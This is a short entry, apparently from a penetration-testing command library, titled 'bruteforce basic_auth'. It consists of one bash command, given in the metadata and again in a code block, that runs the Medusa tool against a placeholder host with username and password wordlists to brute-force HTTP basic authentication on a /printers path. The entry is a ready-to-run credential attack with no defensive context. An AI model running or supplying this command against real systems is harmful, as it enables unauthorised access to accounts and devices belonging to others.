---
id: 2a339900-fe97-4d08-869d-3bc217666d51
name: bruteforce basic_auth
type: command
executor: bash
data: 'medusa -h target-ip -U ../creds/usernames.txt -P ../creds/passwords.txt -M
  http -m DIR:/printers -T 10

  '
output: null
created_at: '2020-07-14T18:14:36.043158+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# bruteforce basic_auth

```bash
medusa -h target-ip -U ../creds/usernames.txt -P ../creds/passwords.txt -M http -m DIR:/printers -T 10

```


